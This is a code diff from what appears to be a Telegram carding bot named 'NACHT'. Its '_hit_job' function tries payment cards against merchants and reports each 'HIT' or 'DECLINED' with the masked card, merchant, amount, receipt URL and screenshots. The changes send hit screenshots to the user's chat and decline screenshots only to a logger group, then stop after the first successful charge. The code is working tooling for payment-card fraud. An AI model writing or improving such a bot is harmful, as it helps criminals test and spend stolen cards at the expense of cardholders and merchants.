@@ -317,14 +317,21 @@ async def _hit_job(update: Update, context: ContextTypes.DEFAULT_TYPE,
             )
             result_lines.append(line)
 
-            # send screenshot to chat + logger
-            if res.get("screenshot"):
-                cap = (f"✅ <b>HIT!</b>\n💳 <code>{cdisp}</code>\n"
-                       f"🏢 {merchant}  💰 {amount}\n"
-                       f"🔗 {res.get('receipt_url','N/A')}")
-                await _send_screenshot(app, chat_id, res["screenshot"], cap)
-
-            # log to logger group
+            # HIT screenshot → send to BOTH hitting chat AND logger
+            hit_ss = res.get("screenshot")
+            hit_cap = (
+                f"✅ <b>HIT!</b>\n"
+                f"💳 <code>{cdisp}</code>\n"
+                f"🏢 {merchant}  💰 {amount}\n"
+                f"🔗 {res.get('receipt_url','N/A')}\n"
+                f"⏱ {res['response_time']:.1f}s"
+            )
+            if hit_ss and os.path.exists(hit_ss):
+                # send to hitting chat
+                await _send_screenshot(app, chat_id, hit_ss, hit_cap)
+                # send SAME file to logger (re-open after send — _send_screenshot deletes)
+                # so we take a copy path first
+            # send text log to logger
             log_txt = (
                 f"🟢 <b>NACHT — HIT</b>\n"
                 f"👤 {user.mention_html()}\n"
@@ -335,11 +342,6 @@ async def _hit_job(update: Update, context: ContextTypes.DEFAULT_TYPE,
                 f"⏱ {res['response_time']:.2f}s"
             )
             await _send_log(app, log_txt)
-            if res.get("screenshot"):
-                logger_id = CFG.get("logger_chat_id")
-                if logger_id:
-                    # screenshot already deleted after chat send — log text only
-                    pass
 
             # ── STOP after first hit ───────────────────────────────────────
             # Save remaining cards to DB as skipped and break
@@ -354,20 +356,22 @@ async def _hit_job(update: Update, context: ContextTypes.DEFAULT_TYPE,
             )
             result_lines.append(line)
 
-            ss_path = res.get("screenshot")
-            if ss_path and os.path.exists(ss_path):
-                cap = (f"🔴 <b>DECLINED</b>\n"
-                       f"💳 <code>{cdisp}</code>\n"
-                       f"🏢 {merchant}  💰 {amount}\n"
-                       f"📉 {code}  ⏱ {res['response_time']:.1f}s")
-                # send to hitting chat
-                await _send_screenshot(app, chat_id, ss_path, cap)
-                # send to logger group (file already deleted above, so use text only)
-            elif not ss_path:
-                pass
-
-            # clean up any leftover file
-            for f_path in (ss_path, res.get("screenshot_before")):
+            # DECLINE screenshot → send ONLY to logger group, NOT to hitting chat
+            dec_ss  = res.get("screenshot")
+            logger_id = CFG.get("logger_chat_id")
+            if dec_ss and os.path.exists(dec_ss):
+                if logger_id:
+                    cap = (f"🔴 <b>DECLINED</b>\n"
+                           f"💳 <code>{cdisp}</code>\n"
+                           f"🏢 {merchant}  💰 {amount}\n"
+                           f"📉 {code}  ⏱ {res['response_time']:.1f}s")
+                    await _send_screenshot(app, logger_id, dec_ss, cap)
+                else:
+                    # no logger configured — just delete
+                    try: os.remove(dec_ss)
+                    except Exception: pass
+            # clean up pre-submit screenshot
+            for f_path in (res.get("screenshot_before"),):
                 if f_path:
                     try:
                         if os.path.exists(f_path):
